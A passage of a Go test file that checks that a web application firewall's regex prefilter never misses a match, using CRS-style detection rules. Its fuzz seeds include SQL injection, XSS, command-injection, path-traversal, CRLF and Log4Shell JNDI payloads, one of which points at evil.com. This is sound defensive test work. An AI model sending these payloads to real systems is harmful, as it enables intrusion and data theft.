			input:   "xxabcdefghijklmnoxx",
			matches: false,
		},
		// Alternation where branches share a prefix
		{
			name:    "shared_prefix_alt",
			pattern: "(?:abcdef|abcxyz)",
			input:   "xabcxyzx",
			matches: true,
		},
		// Nested alternation (previously found by fuzzer)
		{
			name:    "nested_alt_10_00",
			pattern: "10|(10|00)",
			input:   "00",
			matches: true,
		},
		{
			name:    "nested_alt_10_10",
			pattern: "10|(10|00)",
			input:   "10",
			matches: true,
		},
		// Pattern with \b word boundary (zero-width, no literals)
		{
			name:    "word_boundary",
			pattern: `\bhello\b`,
			input:   "say hello world",
			matches: true,
		},
		// Repeat with high min
		{
			name:    "repeat_high_min",
			pattern: `a{5}`,
			input:   "aaaaa",
			matches: true,
		},
		{
			name:    "repeat_high_min_short",
			pattern: `a{5}`,
			input:   "aaaa",
			matches: false,
		},
		// Case-sensitive pattern should NOT match uppercase
		{
			name:    "case_sensitive_exact",
			pattern: "select",
			input:   "SELECT",
			matches: false,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			regexResult := re.MatchString(tc.input)
			if regexResult != tc.matches {
				t.Fatalf("test bug: regex %q on %q = %v, expected %v",
					tc.pattern, tc.input, regexResult, tc.matches)
			}

			ml := minMatchLength(tc.pattern)
			if regexResult && len(tc.input) < ml {
				t.Errorf("FALSE NEGATIVE via minLen: pattern=%q input=%q (len=%d, minLen=%d)",
					tc.pattern, tc.input, len(tc.input), ml)
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && regexResult && !pf(tc.input) {
				t.Errorf("FALSE NEGATIVE via prefilter: pattern=%q input=%q",
					tc.pattern, tc.input)
			}
		})
	}
}

// TestAnyRequiredNeverFiltered verifies that the anyRequired path uses
// anyTooShort (fail-safe) instead of filterShort (silently remove). If any
// alternation branch produces a short literal, the prefilter should be nil
// (no prefilter) rather than checking only the longer alternatives, which
// would risk false negatives.
func TestAnyRequiredNeverFiltered(t *testing.T) {
	// Pattern (é|hello) — é is a single rune but 2 bytes in UTF-8.
	// Both branches should produce usable literals. The prefilter should
	// be non-nil and accept inputs matching either branch.
	t.Run("two_byte_unicode_branch", func(t *testing.T) {
		pattern := "(é|hello)"
		pf := prefilterFunc(pattern)
		// Both "é" (2 bytes) and "hello" (5 bytes) are >= 2, so prefilter exists
		if pf == nil {
			t.Fatal("prefilter should be non-nil: both branches are >= 2 bytes")
		}
		// Must accept matching inputs
		re := regexp.MustCompile(pattern)
		for _, input := range []string{"é", "hello", "xxéxx", "xxhelloxx"} {
			if re.MatchString(input) && !pf(input) {
				t.Errorf("FALSE NEGATIVE: prefilter(%q) rejected matching input %q", pattern, input)
			}
		}
	})

	// Verify that anyTooShort correctly detects short elements
	t.Run("anyTooShort_function", func(t *testing.T) {
		if anyTooShort([]string{"ab", "cd", "ef"}, 2) {
			t.Error("expected false for all >= 2")
		}
		if !anyTooShort([]string{"ab", "c", "ef"}, 2) {
			t.Error("expected true when one element is < 2")
		}
		if !anyTooShort([]string{"", "ab"}, 2) {
			t.Error("expected true for empty element")
		}
		if anyTooShort([]string{}, 2) {
			t.Error("expected false for empty slice")
		}
	})
}

// TestParseErrorPaths verifies that invalid regex patterns are handled gracefully:
// minMatchLength returns 0 and prefilterFunc returns nil.
func TestParseErrorPaths(t *testing.T) {
	invalid := []string{
		"[unclosed",
		"(?P<unclosed",
		"(?",
		"*invalid",
	}
	for _, p := range invalid {
		t.Run(p, func(t *testing.T) {
			if got := minMatchLength(p); got != 0 {
				t.Errorf("minMatchLength(%q) = %d, want 0 for invalid pattern", p, got)
			}
			if got := prefilterFunc(p); got != nil {
				t.Errorf("prefilterFunc(%q) = non-nil, want nil for invalid pattern", p)
			}
		})
	}
}

// TestAllASCIIStrings directly tests the allASCIIStrings helper.
func TestAllASCIIStrings(t *testing.T) {
	if !allASCIIStrings(nil) {
		t.Error("allASCIIStrings(nil) should return true")
	}
	if !allASCIIStrings([]string{}) {
		t.Error("allASCIIStrings([]) should return true")
	}
	if !allASCIIStrings([]string{"abc", "def"}) {
		t.Error("allASCIIStrings([\"abc\",\"def\"]) should return true")
	}
	if allASCIIStrings([]string{"abc", "héllo"}) {
		t.Error("allASCIIStrings with non-ASCII should return false")
	}
	if allASCIIStrings([]string{"ハロー"}) {
		t.Error("allASCIIStrings with non-ASCII only should return false")
	}
}

// TestPrefilterSafetyInvariants tests structural invariants that must hold
// for the prefilter to be safe. These tests catch regressions in the
// extraction logic that could silently introduce false negatives.
func TestPrefilterSafetyInvariants(t *testing.T) {
	// Invariant: for any regex pattern and any input, if the regex matches
	// and we have a prefilter, the prefilter must return true.
	// This is tested exhaustively by the fuzz tests, but here we focus on
	// specific structural patterns that are most likely to regress.

	structural := []struct {
		name    string
		pattern string
		input   string
	}{
		// Concat where one child is anyRequired (skipped, not promoted)
		{"concat_with_anyRequired_child", "(?:union|select)\\s+from", "union from"},
		// Alternation where all branches have allRequired
		{"alt_all_branches_allRequired", "(?:hello world|goodbye world)", "hello world"},
		// Alternation with nested alternation (v... merge)
		{"nested_alt_merge", "aa|(bb|cc)", "cc"},
		// Case-insensitive with ASCII input
		{"ci_ascii_input", "(?i)select", "SELECT"},
		// Case-insensitive with non-ASCII input (must be conservative)
		{"ci_non_ascii_input", "(?i)select", "ſelect"},
		// Case-sensitive with exact bytes
		{"cs_exact_bytes", "hello", "hello"},
		// Pattern with (?sm) prefix (from newRX)
		{"sm_prefix", "(?sm)hello.*world", "hello\nworld"},
		// Multi-byte unicode literal
		{"unicode_literal", "café", "un café chaud"},
	}

	for _, tc := range structural {
		t.Run(tc.name, func(t *testing.T) {
			re := regexp.MustCompile(tc.pattern)
			if !re.MatchString(tc.input) {
				t.Fatalf("test bug: regex %q doesn't match %q", tc.pattern, tc.input)
			}

			ml := minMatchLength(tc.pattern)
			if len(tc.input) < ml {
				t.Errorf("SAFETY VIOLATION: minLen=%d rejects matching input len=%d", ml, len(tc.input))
			}

			pf := prefilterFunc(tc.pattern)
			if pf != nil && !pf(tc.input) {
				t.Errorf("SAFETY VIOLATION: prefilter rejects matching input %q", tc.input)
			}
		})
	}
}

// FuzzPrefilterNoFalseNegatives uses Go's built-in fuzz testing to verify with
// random patterns AND inputs that the prefilter never rejects an input the
// regex matches. This is the primary safety net — it generates arbitrary
// regex patterns that the fuzzer evolves to maximize code coverage.
// Run with: go test -tags coraza.rule.rx_prefilter -fuzz=FuzzPrefilterNoFalseNegatives -fuzztime=60s
func FuzzPrefilterNoFalseNegatives(f *testing.F) {
	// Seed corpus with CRS-representative patterns and realistic inputs.
	patterns := []string{
		// Simple
		"hello",
		"hello.*world",
		"(?i)hello",
		// CRS-style SQLi
		"(?:union|select|insert)",
		"(?i)(?:union\\s+select|insert\\s+into)",
		"(?i)(?:union\\s+(?:all\\s+)?select)",
		// CRS-style command injection
		"(?:;|\\|)\\s*(?:cat|ls|id|whoami)",
		// CRS-style XSS
		"(?i)<script[^>]*>",
		"(?i)(?:on(?:error|load|click)\\s*=)",
		// Function calls
		"sleep\\s*\\(",
		// Nested alternation (found by prior fuzzing)
		"10|(10|00)",
		"(a|b)|(c|d)",
		"(?:(?:aa|bb)|(?:cc|dd))",
		// Complex nesting
		"ab(cd|ef)gh",
		"(?:cat|dog|bird)",
		// Path traversal
		"(?:\\.{2}[/\\\\]){2,}",
		// Anchored
		"^hello$",
		"\\bhello\\b",
		// Repetition
		"(ab)+",
		"(abc){2,4}",
		// Optional parts
		"hello\\s*world",
		"(?:foo)?bar",
		// Character classes with literals
		"[a-z]+test",
		"test[0-9]+end",
		// Unicode
		"ハロー",
		"café",
	}
	inputs := []string{
		// Benign traffic
		"GET /index.html HTTP/1.1",
		"POST /api/v1/users HTTP/1.1",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		"just a normal string with spaces",
		// Attack payloads
		"union select * from users--",
		"UNION ALL SELECT 1,2,3",
		"insert into t values(1)",
		"INSERT INTO t VALUES(1)",
		"; cat /etc/passwd",
		"| ls -la /",
		"sleep(5)",
		"<script>alert(1)</script>",
		"<SCRIPT>alert(document.cookie)</SCRIPT>",
		"onerror=alert(1)",
		"../../../etc/passwd",
		"${jndi:ldap://evil.com/a}",
		"<?php echo 'pwned'; ?>",
		"\r\ncontent-type: text/html",
		// Edge cases
		"",
		"x",
		"00",
		"10",
		"hello",
		"HELLO",
		"hElLo",
		"hello world",
		"helloworld",
		"abcdgh",
		"abefgh",
		strings.Repeat("a", 100),
		strings.Repeat("ab", 50),
		// Unicode
		"ハローワールド",
		"un café chaud",
		// Unicode fold equivalents (ſ = long s, K = Kelvin sign)
		"ſelect",
		"ſleep(5)",
		"o\u212a",
		"inſert into t",
	}
	for _, p := range patterns {
		for _, inp := range inputs {
			f.Add(p, inp)
		}
	}

	f.Fuzz(func(t *testing.T, pattern, input string) {
		// Cap lengths to avoid expensive regex evaluations that stall the fuzzer.
		if len(pattern) > 256 || len(input) > 512 {
			return
		}

		// Skip invalid regex patterns
		re, err := regexp.Compile(pattern)
		if err != nil {
			return
		}

		regexMatches := re.MatchString(input)

		ml := minMatchLength(pattern)
		if regexMatches && len(input) < ml {
			t.Errorf("FALSE NEGATIVE via minLen: pattern=%q input=%q (len=%d, minLen=%d)",
				pattern, input, len(input), ml)
		}

		pf := prefilterFunc(pattern)
		if pf != nil && regexMatches && !pf(input) {
			t.Errorf("FALSE NEGATIVE via prefilter: pattern=%q input=%q",
				pattern, input)
		}
	})
}

// FuzzPrefilterFixedCRSPatterns fuzzes with fixed CRS-representative patterns
// against random inputs. This simulates real-world usage: the patterns are
// known at compile time (from CRS rules), the inputs are arbitrary user traffic.
// Run with: go test -tags coraza.rule.rx_prefilter -fuzz=FuzzPrefilterFixedCRSPatterns -fuzztime=60s
func FuzzPrefilterFixedCRSPatterns(f *testing.F) {
	f.Add("normal request data")
	f.Add("union select * from users")
	f.Add("<script>alert(1)</script>")
	f.Add("sleep(5)")
	f.Add("../../../etc/passwd")
	f.Add("")
	f.Add("x")
	f.Add(strings.Repeat("union", 20))
	f.Add("UNION SELECT")
	f.Add("' OR '1'='1")
	f.Add("${jndi:ldap://x}")
	f.Add("\r\nSet-Cookie: evil=1")

	// Fixed patterns representative of real CRS rules
	crsPatterns := []string{
		`(?i)(?:union\s+(?:all\s+)?select)`,
		`(?i)(?:insert\s+into|delete\s+from|update\s+\w+\s+set)`,
		`(?i)<script[^>]*>`,
		`(?i)(?:on(?:error|load|click|mouse\w+)\s*=)`,
		`(?:;|\|)\s*(?:cat|ls|id|whoami|passwd)`,
		`sleep\s*\(`,
		`(?i)(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)(?:[^\}]{0,15}(?:\$|&dollar;?)(?:\{|&l(?:brace|cub);?)|jndi|ctx)`,
		`[\r\n]\s*(?:content-(?:type|length)|set-cookie|location)\s*:`,
		`(?i)<\?(?:php|=)`,
		`(?:\.{2}[/\\]){3,}`,
		`(?i)(?:exec|system|passthru|popen|proc_open)\s*\(`,
		`hello.*world`,
		`(?:union|select|insert|delete|update|drop|alter|create)`,
	}

	// Precompile all patterns and their prefilters
	type compiled struct {
		re *regexp.Regexp
		ml int
		pf func(string) bool
	}
	cc := make([]compiled, len(crsPatterns))
	for i, p := range crsPatterns {
		cc[i] = compiled{
			re: regexp.MustCompile(p),
			ml: minMatchLength(p),
			pf: prefilterFunc(p),
		}
	}

	f.Fuzz(func(t *testing.T, input string) {
		// Cap input length to prevent the fuzzer from generating strings that
		// cause expensive regex evaluations and stall the fuzzer. CRS patterns
		// can be costly on longer inputs (e.g. log4shell with backtracking).
		if len(input) > 128 {
			return
		}
		for i, c := range cc {
			regexMatches := c.re.MatchString(input)

			if regexMatches && len(input) < c.ml {
				t.Errorf("FALSE NEGATIVE via minLen: pattern=%q input=%q (len=%d, minLen=%d)",
					crsPatterns[i], input, len(input), c.ml)
			}

			if c.pf != nil && regexMatches && !c.pf(input) {
				t.Errorf("FALSE NEGATIVE via prefilter: pattern=%q input=%q",
					crsPatterns[i], input)
			}
		}
	})
}

// TestMinLenRuneError verifies that U+FFFD in a literal counts as 1 byte, not 3.
func TestMinLenRuneError(t *testing.T) {
	// Pattern with a literal U+FFFD — after parsing, the AST has an OpLiteral
	// with rune U+FFFD. Go's regexp matches this against a single invalid byte.
	got := minMatchLength("\xef\xbf\xbd")
	if got != 1 {
		t.Errorf("minMatchLength(U+FFFD) = %d, want 1", got)
	}
	// Mixed: literal 'ab' + U+FFFD = 2 + 1 = 3
	got = minMatchLength("ab\xef\xbf\xbd")
	if got != 3 {
		t.Errorf("minMatchLength(ab + U+FFFD) = %d, want 3", got)
	}
}

// TestExtractLiteralsRuneError verifies that U+FFFD in a literal causes bail-out.
func TestExtractLiteralsRuneError(t *testing.T) {
	pf := prefilterFunc("(?s)\xef\xbf\xbd" + "hello")
	// Should bail out because the literal contains U+FFFD.
	if pf != nil {
		t.Error("prefilterFunc should return nil for pattern containing U+FFFD literal")
	}
}

// TestPrefilterAllRequiredFilteredToEmpty covers the case where allRequired
// literals are all too short after filtering (< 2 bytes).
func TestPrefilterAllRequiredFilteredToEmpty(t *testing.T) {
	// Pattern: a single-char literal concatenated with a wildcard — "a.*"
	// extractLiterals yields allRequired{"a"}, filterShort removes it → nil.
	pf := prefilterFunc("(?s)a.*")
	if pf != nil {
		t.Error("prefilterFunc should return nil when all literals are too short")
	}
}

// TestPrefilterAllRequiredMultiNeedleCaseInsensitive covers the case-insensitive
// multi-needle allRequired path (lines 194-202).
func TestPrefilterAllRequiredMultiNeedleCaseInsensitive(t *testing.T) {
	// Pattern: (?i)hello.*world — two required CI literals.
	pf := prefilterFunc("(?si)hello.*world")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for (?i)hello.*world")
	}
	// Both present (case-insensitive match)
	if !pf("foo HELLO bar WORLD baz") {
		t.Error("expected true when both CI literals present")
	}
	// One missing
	if pf("foo HELLO bar baz") {
		t.Error("expected false when 'world' is absent")
	}
	// Both present in matching input
	if !pf("HeLLo something WoRlD") {
		t.Error("expected true for mixed-case match")
	}
}

// TestPrefilterAllRequiredMultiNeedleCaseSensitive covers the case-sensitive
// multi-needle allRequired path (lines 203-211).
func TestPrefilterAllRequiredMultiNeedleCaseSensitive(t *testing.T) {
	// Pattern: hello.*world — two required CS literals, no (?i).
	pf := prefilterFunc("(?s)hello.*world")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for hello.*world")
	}
	if !pf("prefix hello middle world suffix") {
		t.Error("expected true when both literals present")
	}
	if pf("prefix hello middle suffix") {
		t.Error("expected false when 'world' is absent")
	}
	// Case-sensitive: HELLO should not match
	if pf("HELLO WORLD") {
		t.Error("expected false for case-sensitive mismatch")
	}
}

// TestPrefilterAnyRequiredSingleNeedle covers the anyRequired single-element
// paths for both CI and CS (lines 226-236).
func TestPrefilterAnyRequiredSingleNeedle(t *testing.T) {
	// Alternation where one branch is too short gets abandoned.
	// Use branches that are all >= 2 bytes but only one branch.
	// A single-branch alternation: (hello) is really just allRequired.
	// To get anyRequired with 1 element, we need a nested alternation that
	// collapses. Instead, test the single-needle CS path via a 2-branch pattern
	// where one gets merged.
	//
	// Actually, the simplest way: pattern `(ab|cd)` yields anyRequired{"ab","cd"}
	// which hits the AC path. To test single-element anyRequired, we need a
	// pattern like `(ab)` parsed as alternation — but that's OpCapture.
	// Let's test the CI+CS anyRequired with 2 elements instead (lines 228-235).

	// Case-insensitive anyRequired single needle — unreachable in practice
	// because OpAlternate always has >= 2 sub-expressions. Skip.

	// Case-sensitive anyRequired 2 elements
	pf := prefilterFunc("(?s)(?:hello|world)")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for hello|world")
	}
	if !pf("contains hello here") {
		t.Error("expected true when 'hello' present")
	}
	if !pf("contains world here") {
		t.Error("expected true when 'world' present")
	}
	if pf("contains nothing here") {
		t.Error("expected false when neither present")
	}
}

// TestPrefilterAnyRequiredCaseInsensitiveAC covers the CI Aho-Corasick path.
func TestPrefilterAnyRequiredCaseInsensitiveAC(t *testing.T) {
	pf := prefilterFunc("(?si)(?:hello|world)")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for (?i)hello|world")
	}
	if !pf("HELLO there") {
		t.Error("expected true for CI match on 'HELLO'")
	}
	if !pf("WoRlD") {
		t.Error("expected true for CI match on 'WoRlD'")
	}
	if pf("nothing here") {
		t.Error("expected false when neither present")
	}
}

// TestPrefilterAnyRequiredNonASCIIBailout covers the non-ASCII guard for
// CI anyRequired Aho-Corasick path (lines 237-243).
func TestPrefilterAnyRequiredNonASCIIBailout(t *testing.T) {
	// Construct a pattern that produces anyRequired with non-ASCII literals.
	// (?i)(café|naïve) — after lowercasing, needles contain non-ASCII bytes.
	pf := prefilterFunc("(?si)(?:café|naïve)")
	// Should bail out because needles are non-ASCII under CI.
	if pf != nil {
		t.Error("prefilterFunc should return nil for CI pattern with non-ASCII literals")
	}
}

// TestPrefilterNonCaseInsensitiveReturnsDirectly covers the non-CI return path
// (line 285) — pf is returned without the isASCII wrapper.
func TestPrefilterNonCaseInsensitiveReturnsDirectly(t *testing.T) {
	pf := prefilterFunc("(?s)hello")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for 'hello'")
	}
	// Non-ASCII input should be checked literally (no isASCII guard).
	if pf("café") {
		t.Error("expected false: 'hello' not in 'café'")
	}
	if !pf("say hello") {
		t.Error("expected true: 'hello' in 'say hello'")
	}
}

// TestExtractLiteralsOpConcatAnyRequiredChild covers the case where OpConcat
// has an anyRequired child that gets skipped (lines 339-343).
func TestExtractLiteralsOpConcatAnyRequiredChild(t *testing.T) {
	// Pattern: (ab|cd).*required — OpConcat with an OpAlternate child (anyRequired),
	// wildcard, and an OpLiteral child. The wildcard forces a real concatenation.
	// The anyRequired from the alternation is skipped in OpConcat; only "required"
	// is kept as allRequired.
	pf := prefilterFunc("(?s)(?:ab|cd).*required")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil")
	}
	if !pf("ab stuff required here") {
		t.Error("expected true: 'required' present")
	}
	if pf("ab stuff missing here") {
		t.Error("expected false: 'required' absent")
	}
}

// TestExtractLiteralsOpAlternateNilBranch covers OpAlternate where one branch
// has no extractable literal (lines 360-362).
func TestExtractLiteralsOpAlternateNilBranch(t *testing.T) {
	// Pattern: (hello|.+) — second branch is .+ which has no literal.
	pf := prefilterFunc("(?s)(?:hello|.+)")
	if pf != nil {
		t.Error("prefilterFunc should return nil when one alternation branch has no literal")
	}
}

// TestExtractLiteralsNestedAlternation covers the anyRequired merge path
// for nested alternations (lines 368-374).
func TestExtractLiteralsNestedAlternation(t *testing.T) {
	// Pattern: (hello|(world|test)) — nested alternation.
	pf := prefilterFunc("(?s)(?:hello|(?:world|test))")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for nested alternation")
	}
	if !pf("hello") {
		t.Error("expected true for 'hello'")
	}
	if !pf("world") {
		t.Error("expected true for 'world'")
	}
	if !pf("test") {
		t.Error("expected true for 'test'")
	}
	if pf("none") {
		t.Error("expected false for 'none'")
	}
}

// TestExtractLiteralsOpRepeat covers OpRepeat in extractLiterals (lines 385-389).
func TestExtractLiteralsOpRepeat(t *testing.T) {
	// OpRepeat with min>=1: should extract literals from sub.
	// Note: Simplify() may expand {n,m} to concat/quest, but we test the
	// function directly via minMatchLength which also exercises the AST.
	// For extractLiterals, a pattern like (hello){2,3} after simplify becomes
	// OpConcat(hello, hello, OpQuest(hello)).

	// OpRepeat with min==0: should return nil.
	// Pattern: (hello){0,3} — optional repetition.
	pf := prefilterFunc("(?s)(?:hello){0,3}")
	if pf != nil {
		t.Error("prefilterFunc should return nil for {0,3} (min==0)")
	}
}

// TestLongestEmpty covers longest with an empty slice (line 416-417).
func TestLongestEmpty(t *testing.T) {
	if got := longest(nil); got != "" {
		t.Errorf("longest(nil) = %q, want empty", got)
	}
	if got := longest([]string{}); got != "" {
		t.Errorf("longest([]) = %q, want empty", got)
	}
}

// TestAllASCIIStringsNonASCII covers allASCIIStrings returning false (line 456-457).
func TestAllASCIIStringsNonASCII(t *testing.T) {
	if allASCIIStrings([]string{"hello", "café"}) {
		t.Error("allASCIIStrings should return false for non-ASCII")
	}
	if !allASCIIStrings([]string{"hello", "world"}) {
		t.Error("allASCIIStrings should return true for all ASCII")
	}
}

// TestPrefilterAnyTooShortBailout covers the anyTooShort bail-out (lines 222-223).
func TestPrefilterAnyTooShortBailout(t *testing.T) {
	// Pattern: (a|hello) — 'a' is 1 byte < 2, so anyTooShort triggers bail-out.
	pf := prefilterFunc("(?s)(?:a|hello)")
	if pf != nil {
		t.Error("prefilterFunc should return nil when anyRequired has too-short elements")
	}
}

// TestPrefilterPfNilGuard covers the pf == nil guard (lines 261-263).
// This happens when lits is a type we don't handle (shouldn't happen in practice,
// but the guard exists). We can trigger it if extractLiterals returns an
// unexpected type — but since we control the types, we test via patterns where
// the switch cases don't set pf (e.g., extractLiterals returns allRequired but
// all get filtered out).
func TestPrefilterPfNilGuard(t *testing.T) {
	// This is already covered by TestPrefilterAllRequiredFilteredToEmpty above,
	// but we also test with a pattern that reaches the switch but no case matches.
	// In practice, lits is always allRequired or anyRequired, so the nil guard
	// is only reached when filtering removes everything.

	// Pattern with only 1-char literals: "a.*b" → allRequired{"a","b"} → filtered to empty.
	pf := prefilterFunc("(?s)a.*b")
	if pf != nil {
		t.Error("prefilterFunc should return nil when all allRequired literals too short")
	}
}

// TestPrefilterCaseInsensitiveWithNonASCIIInput covers the isASCII guard wrapper
// for CI patterns with non-ASCII input (lines 275-282).
func TestPrefilterCaseInsensitiveWithNonASCIIInput(t *testing.T) {
	pf := prefilterFunc("(?si)hello")
	if pf == nil {
		t.Fatal("prefilterFunc should return non-nil for (?i)hello")
	}
	// Non-ASCII input: should conservatively return true (maybe match).
	if !pf("héllo") {
		t.Error("expected true for non-ASCII input with CI pattern (conservative)")
	}
	// ASCII input without match: should return false.
	if pf("goodbye") {
		t.Error("expected false for 'goodbye'")
	}
}

// TestMinLenOpRepeatUnreachable exercises the OpRepeat branch in minLen that is
// normally unreachable after Simplify (lines 140-148). We test it indirectly
// via patterns that include quantifiers.
func TestMinLenOpRepeatViaPattern(t *testing.T) {
	// {3,5} → Simplify expands to OpConcat/OpQuest, but minLen still computes
	// correctly because the expanded form sums to the same minimum.
	if got := minMatchLength("a{3,5}"); got != 3 {
		t.Errorf("minMatchLength(a{3,5}) = %d, want 3", got)
	}
	// {0,5} → minimum is 0
	if got := minMatchLength("a{0,5}"); got != 0 {
		t.Errorf("minMatchLength(a{0,5}) = %d, want 0", got)
	}
}

// TestExtractLiteralsEmptyBranchLits covers the empty branchLits guard
// in OpAlternate (lines 377-379).
func TestExtractLiteralsEmptyBranchLits(t *testing.T) {
	// Pattern where all alternation branches have no extractable literals.
	// (.+|.*) — both branches are wildcards.
	pf := prefilterFunc("(?s)(?:.+|.*)")
	if pf != nil {
		t.Error("prefilterFunc should return nil when no branch has literals")
	}
}

// TestTrieReconstructionBasic verifies that prefilterFunc correctly handles
// Simplify()-generated trie patterns where a short single-byte prefix is
// factored out of an alternation.
//
// Without trie reconstruction:
//   select|sleep|substr  →  s(?:elect|leep|ubstr)
//   extractLiterals(OpLiteral("s")) = nil  →  whole pattern = nil
//   prefilterFunc returns nil  →  no prefilter built at all
//
// With trie reconstruction the full words are recovered and used as the
// anyRequired set, enabling sub-linear Wu-Manber prefiltering.
func TestTrieReconstructionBasic(t *testing.T) {
	tests := []struct {
		name        string
		pattern     string
		shouldMatch []string
		shouldMiss  []string
	}{
		{
			name:    "single_prefix_alternation",
			pattern: "(?i)(?:select|sleep|substr)",
			// Simplify() → s(?:elect|leep|ubstr) — single-byte prefix 's'
			shouldMatch: []string{"SELECT", "sleep(1)", "substr(x,1)"},
			shouldMiss:  []string{"hello world", "GET /api/v1/users", "x=1&y=2"},
		},
		{
			name:    "multi_group_sql_keywords",
			pattern: "(?i)(?:select|sleep|substr|union|update|insert|delete)",
			// Simplify() groups by first byte: s(..), u(..), i(..), d(..)
			// Each group has a single-byte prefix that was previously causing nil.
			shouldMatch: []string{"SELECT id", "UNION ALL", "UPDATE users", "INSERT INTO", "DELETE FROM"},
			shouldMiss:  []string{"GET /home", "Host: example.com", "Content-Type: text/html"},
		},
		{
			name:    "two_char_prefix_reconstruction",
			pattern: "(?i)(?:replace|reverse|repeat)",
			// Simplify() → re(?:place|verse|peat) — 2-char prefix "re"
			// The 2-char prefix IS extracted by the standard path as allRequired{"re"},
			// so this tests that the standard path still works correctly.
			shouldMatch: []string{"REPLACE INTO", "reverse order", "repeat(x,3)"},
			shouldMiss:  []string{"hello world", "GET /users"},
		},
		{
			name:    "nested_trie_reconstruction",
			pattern: "(?i)(?:select|set|sleep)",
			// Simplify() → s(?:e(?:lect|t)|leep) — nested trie
			// Inner: e(?:lect|t) → extractLiterals returns anyRequired{"elect","et"}
			// Outer: s + anyRequired{"elect","et","leep"} → anyRequired{"select","set","sleep"}
			shouldMatch: []string{"SELECT *", "set @x=1", "SLEEP(5)"},
			shouldMiss:  []string{"GET /api", "x=1&y=2"},
		},
		{
			name:    "large_sql_alternation",
			pattern: "(?i)(?:select|sleep|substr|union|update|insert|delete|alter|create|benchmark|floor|format|length|concat|decode|encode|replace|reverse|trim|upper)",
			// 20 SQL keywords — Simplify() groups: s(..), u(..), i(..), d(..), a(..), c(..), b(..), f(..), l(..), r(..), t(..)
			// Previously: all groups with single-byte prefix returned nil → no prefilter
			// After fix: each group reconstructed → anyRequired{all 20 keywords}
			shouldMatch: []string{"SELECT id FROM", "UNION ALL SELECT", "benchmark(1000000,1)", "UPPER(col)"},
			shouldMiss:  []string{"GET /api/v1/users?page=1", "Host: example.com", "Content-Type: application/json"},
		},
	}

	for _, tc := range tests {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			pf := prefilterFunc(tc.pattern)
			if pf == nil {
				t.Fatalf("prefilterFunc returned nil — trie reconstruction likely not working (pattern: %s)", tc.pattern)
			}
			for _, s := range tc.shouldMatch {
				if !pf(s) {
					t.Errorf("prefilter false-negative for input %q (pattern: %s)", s, tc.pattern)
				}
			}
			for _, s := range tc.shouldMiss {
				if pf(s) {
					t.Errorf("prefilter false-positive for input %q (pattern: %s)", s, tc.pattern)
				}
			}
		})
	}
}

// TestTrieReconstructionEndToEnd verifies the full prefilter+regex pipeline
// for Simplify()-generated trie patterns. The prefilter is a conservative
// "maybe match" filter — it is allowed to say true for benign inputs (false
// positives are acceptable; false negatives are not).
func TestTrieReconstructionEndToEnd(t *testing.T) {
	// 20 SQL injection keywords — a typical mid-size CRS alternation.
	keywords := []string{
		"select", "sleep", "substr", "union", "update", "insert", "delete",
		"alter", "create", "benchmark", "floor", "format", "length", "concat",
		"decode", "encode", "replace", "reverse", "trim", "upper",
	}
	pattern := "(?i)(?:" + strings.Join(keywords, "|") + ")"
	re := regexp.MustCompile(pattern)
	pf := prefilterFunc(pattern)
	if pf == nil {
		t.Fatal("prefilterFunc returned nil for 20-keyword SQL pattern — trie reconstruction must work")
	}

	// Benign inputs: prefilter is allowed to say true (false positive is OK),
	// but regex must NOT match. We just verify no false negatives exist.
	benign := []string{
		"GET /api/v1/users?page=1&limit=50",
		"Host: www.example.com",
		"Content-Type: application/json",
		"Authorization: Bearer eyJhbGciOiJSUzI1NiJ9",
		"john.doe@example.com",
	}
	for _, s := range benign {
		if re.MatchString(s) {
			t.Errorf("regex unexpectedly matched benign input %q", s)
		}
		// Safety: if regex=false, prefilter is allowed to be true (false positive)
		// or false (correct skip). Both are valid. Only prefilter=false AND
		// regex=true would be a bug — tested separately in TestTrieReconstructionSafety.
	}

	// Effectiveness: at least half of benign inputs should be skipped (prefilter=false).
	// This is a loose check to catch major regressions where reconstruction makes
	// the prefilter useless by matching everything.
	skipped := 0
	for _, s := range benign {
		if !pf(s) {
			skipped++
		}
	}
	if skipped == 0 {
		t.Errorf("prefilter matched ALL benign inputs — likely too many short needles (e.g. 're', 'tr')")
	}

	// Malicious inputs: prefilter MUST say true (run regex), and regex must match.
	malicious := []string{
		"1 UNION SELECT * FROM users--",
		"'; INSERT INTO logs VALUES('pwned')--",
		"1 AND SLEEP(5)--",
		"BENCHMARK(1000000,MD5(1))",
		"CONCAT(0x61,0x62)",
	}
	for _, s := range malicious {
		if !pf(s) {
			t.Errorf("prefilter false-negative for malicious input %q", s)
		}
		if !re.MatchString(strings.ToLower(s)) {
			t.Errorf("regex did not match malicious input %q", s)
		}
	}
}

// TestTrieReconstructionSafety verifies that trie reconstruction never produces
// false negatives: for inputs that the regex matches, the prefilter must also
// return true.
func TestTrieReconstructionSafety(t *testing.T) {
	patterns := []string{
		"(?i)(?:select|sleep|substr|union)",
		"(?i)(?:select|sleep|substr|union|update|insert|delete|alter|create|benchmark|floor|format|length|concat|decode|encode|replace|reverse|trim|upper)",
		"(?i)(?:exec|execute|call|sp_|xp_|@@version|information_schema)",
	}
	inputs := []string{
		"SELECT * FROM users", "sleep(5)", "UNION SELECT", "update users set",
		"INSERT INTO t", "delete from t where", "benchmark(1000,1)",
		"floor(rand())", "UPPER('a')", "concat(1,2)",
		"1 AND 1=1", "'; DROP TABLE--", "admin'--",
	}

	for _, pat := range patterns {
		re, err := regexp.Compile(pat)
		if err != nil {
			t.Fatalf("compile %q: %v", pat, err)
		}
		pf := prefilterFunc(pat)
		if pf == nil {
			continue // no prefilter built — skip (not a failure)
		}
		for _, input := range inputs {
			regexMatch := re.MatchString(input)
			prefilterSays := pf(input)
			// Safety invariant: if regex matches, prefilter must NOT say false.
			if regexMatch && !prefilterSays {
				t.Errorf("SAFETY VIOLATION: prefilter false-negative\n  pattern=%q\n  input=%q\n  regex=true prefilter=false", pat, input)
			}
